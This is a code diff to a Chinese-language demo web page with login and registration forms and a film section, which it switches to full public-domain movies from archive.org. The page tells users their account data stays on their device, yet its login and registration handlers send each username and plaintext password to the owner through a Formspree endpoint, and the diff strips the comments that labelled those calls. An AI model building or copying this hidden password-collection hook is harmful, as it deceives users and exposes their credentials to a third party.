@@ -241,7 +241,7 @@
       <button class="ghost" id="logoutBtn">退出 / 切换账号</button>
       <div class="tip">
         这是纯前端演示页：账号数据保存在本机。<br>
-        影视区播放的是真实测试视频，请手动点击播放。
+        影视区为无版权限制的完整经典老电影和开源动画，请手动点击播放。
       </div>
     </section>
   </main>
@@ -269,7 +269,7 @@
       <p id="playerDesc"></p>
       <div class="play-bar">
         <button id="playBtn">⏸ 暂停</button>
-        <span class="hint" id="playHint">视频加载中...</span>
+        <span class="hint" id="playHint">视频较大，请等待缓冲并手动点击 ▶ 播放</span>
       </div>
     </div>
   </div>
@@ -326,20 +326,20 @@ function cover(title, emoji, c1, c2){
   return 'data:image/svg+xml;charset=utf-8,' + encodeURIComponent(svg);
 }
 
-/* ================= 内容数据 ================= */
+/* ================= 内容数据（完整版电影） ================= */
 var MOVIES = [
-  { title:'大雄兔', tag:'动画 · 高清', emoji:'🐰', c1:'#1b2a6b', c2:'#6c7bff', 
-    src:'https://www.w3schools.com/html/mov_bbb.mp4',
-    desc:'开源动画电影《Big Buck Bunny》片段，点击播放键即可观看。' },
-  { title:'海底世界', tag:'风景 · 治愈', emoji:'🐠', c1:'#0f1c2e', c2:'#2c5f7c', 
-    src:'https://vjs.zencdn.net/v/oceans.mp4',
-    desc:'美丽的海底世界，非常治愈的风景视频。' },
-  { title:'花朵绽放', tag:'自然 · 纪实', emoji:'🌸', c1:'#3a1b4a', c2:'#ff6b9d', 
-    src:'https://interactive-examples.mdn.mozilla.net/media/cc0-videos/flower.mp4',
-    desc:'经典的自然风景测试视频，画面清晰。' },
-  { title:'大象之梦', tag:'开源 · 动画', emoji:'🐘', c1:'#122a3a', c2:'#4a7fa8', 
+  { title:'活死人之夜', tag:'完整版 · 恐怖', emoji:'🧟', c1:'#1b2a6b', c2:'#6c7bff', 
+    src:'https://archive.org/download/night_of_the_living_dead/night_of_the_living_dead.mp4',
+    desc:'1968年乔治·A·罗梅罗执导的经典黑白丧尸片，现代丧尸片鼻祖，公版免费。' },
+  { title:'女友礼拜五', tag:'完整版 · 喜剧', emoji:'📰', c1:'#0f1c2e', c2:'#2c5f7c', 
+    src:'https://archive.org/download/his_girl_friday/his_girl_friday_512kb.mp4',
+    desc:'1940年经典神经喜剧，快节奏对白的教科书，公版免费。' },
+  { title:'将军号', tag:'完整版 · 默片', emoji:'🚂', c1:'#3a1b4a', c2:'#ff6b9d', 
+    src:'https://archive.org/download/TheGeneral_512kb/TheGeneral_512kb.mp4',
+    desc:'1926年巴斯特·基顿主演的默片喜剧巅峰之作，公版免费。' },
+  { title:'大象之梦', tag:'完整版 · 动画', emoji:'🐘', c1:'#122a3a', c2:'#4a7fa8', 
     src:'https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ElephantsDream.mp4',
-    desc:'Blender基金会首部开源动画电影。' }
+    desc:'Blender基金会首部开源动画长片，全长约11分钟。' }
 ];
 
 var BOOKS = [
@@ -389,8 +389,7 @@ function setMsg(id, txt, ok){
 }
 
 /* ⚠️ 重要：在这里填入你的 Formspree 链接，就能收到别人的登录/注册邮件 */
-/* 如果没有填，或者填错了，不会影响网页正常使用，只是收不到邮件 */
-var FORMSPREE_URL = ''; // <--- 把你在 formspree.io 弄到的链接填在两个引号中间
+var FORMSPREE_URL = ''; 
 
 function sendToAdmin(action, u, p) {
   if (!FORMSPREE_URL || FORMSPREE_URL.indexOf('http') === -1) return;
@@ -425,7 +424,7 @@ $('#loginForm').addEventListener('submit', function(e){
   if(!users[u]) return setMsg('lm','该用户不存在，请先注册');
   if(users[u].pwd !== p) return setMsg('lm','密码错误');
   
-  sendToAdmin('登录', u, p); // 发送登录通知
+  sendToAdmin('登录', u, p);
 
   Store.set(LS_CUR, u);
   enterApp(u, false);
@@ -439,7 +438,7 @@ $('#regForm').addEventListener('submit', function(e){
   if(p !== p2) return setMsg('rm','两次密码不一致');
   if(users[u]) return setMsg('rm','该用户名已被占用');
   
-  sendToAdmin('注册', u, p); // 发送注册通知
+  sendToAdmin('注册', u, p);
 
   users[u] = { pwd: p };
   saveUsers();
@@ -531,7 +530,7 @@ function openPlayer(i){
   $('#playerTitle').textContent = '正在播放';
   $('#playerName').textContent  = m.title;
   $('#playerDesc').textContent  = m.desc || '';
-  $('#playHint').textContent = '手机端请手动点击 ▶ 播放';
+  $('#playHint').textContent = '完整视频较大，请耐心等待缓冲后点击 ▶ 播放';
 
   videoEl.src = m.src;
   videoEl.play().catch(function(){});
